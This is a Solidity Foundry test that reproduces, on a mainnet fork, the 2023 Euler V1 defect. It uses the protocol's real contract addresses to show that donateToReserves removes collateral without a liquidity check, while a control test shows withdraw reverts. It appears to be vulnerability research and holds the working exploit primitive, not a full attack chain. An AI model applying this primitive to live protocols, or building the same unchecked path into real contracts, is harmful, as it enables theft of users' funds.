// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IEToken is IERC20 {
    function deposit(uint256 subAccountId, uint256 amount) external;
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
}

interface IDToken {
    function borrow(uint256 subAccountId, uint256 amount) external;
}

interface IMarkets {
    function enterMarket(uint256 subAccountId, address underlying) external;
}

/// @title Phase 0.2 — does the Euler V1 defect reproduce on a fork?
///
/// @notice The 2023-03-13 Euler V1 incident ($197M) came from `EToken.donateToReserves`
///         reducing collateral WITHOUT a post-operation liquidity check. Every other
///         balance-reducing path goes through `checkLiquidity` and reverts when it would
///         leave the account unhealthy. `donateToReserves` did not.
///
///         The finding is the ASYMMETRY: the same collateral reduction reverts on the
///         checked path (`withdraw`) and succeeds on the unchecked one (`donateToReserves`).
///
/// @dev    Euler's dispatcher routes by module, so calls must go to the right contract:
///           - `enterMarket`  -> the MARKETS MODULE PROXY (not the main contract)
///           - `deposit` / `donateToReserves` / `borrow` -> the eToken / dToken proxies
///         `enterMarket` takes the UNDERLYING asset, not the eToken:
///         `Markets.enterMarket` requires `underlyingLookup[newMarket].eTokenAddress != 0`.
contract EulerInvariantTest is Test {
    address constant EULER = 0x27182842E098f60e3D576794A5bFFb0777E025d3;
    address constant MARKETS = 0x3520d5a913427E6F0D6A83E07ccD4A4da316e4d3; // module id 2 proxy
    address constant eWETH = 0x1b808F49ADD4b8C6b5117d9681cF7312Fcf0dC1D;
    address constant dUSDC = 0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 constant COLLATERAL = 100 ether;
    uint256 constant DEBT = 50_000e6; // well inside the limit: the account starts healthy

    address user = address(0xBEEF);

    function setUp() public {
        deal(WETH, user, 500 ether);
        vm.startPrank(user);
        // Euler eTokens CALL the main contract, so inside `deposit` `address(this)` is the
        // Euler main contract — the spender WETH sees is EULER, not the eToken proxy.
        IERC20(WETH).approve(EULER, type(uint256).max);
        IEToken(eWETH).deposit(0, COLLATERAL);
        vm.stopPrank();
    }

    /// @notice THE FINDING: an unchecked collateral reduction leaves the account unhealthy.
    function test_donateToReserves_skipsHealthCheck() public {
        vm.startPrank(user);
        IMarkets(MARKETS).enterMarket(0, WETH);
        IDToken(dUSDC).borrow(0, DEBT);
        vm.stopPrank();

        uint256 collBefore = IEToken(eWETH).balanceOf(user);
        emit log_named_uint("eWETH collateral BEFORE", collBefore);

        // Give away almost all collateral. With debt outstanding this MUST make the account
        // unhealthy — and a checked path would revert here.
        vm.prank(user);
        IEToken(eWETH).donateToReserves(0, collBefore - 1 ether);

        uint256 collAfter = IEToken(eWETH).balanceOf(user);
        emit log_named_uint("eWETH collateral AFTER ", collAfter);
        emit log_string("donateToReserves did NOT revert -> missing liquidity check");

        assertLt(collAfter, collBefore, "collateral must have actually decreased");
        assertLt(collAfter, 2 ether, "collateral must be effectively gone vs the debt");
    }

    /// @notice NEGATIVE CONTROL: the same collateral reduction on a CHECKED path reverts.
    ///         Without this, the test above could be asserting a property of the fork
    ///         rather than the defect.
    function test_control_withdraw_isChecked() public {
        vm.startPrank(user);
        IMarkets(MARKETS).enterMarket(0, WETH);
        IDToken(dUSDC).borrow(0, DEBT);
        vm.stopPrank();

        uint256 coll = IEToken(eWETH).balanceOf(user);

        vm.prank(user);
        (bool ok, bytes memory ret) = eWETH.call(
            abi.encodeWithSignature("withdraw(uint256,uint256)", 0, coll - 1 ether)
        );

        emit log_named_uint("control withdraw succeeded (want 0)", ok ? 1 : 0);
        if (!ok && ret.length > 0) emit log_string(string(ret));

        assertFalse(ok, "control failed: the checked path ALSO allowed an unhealthy account");
    }
}
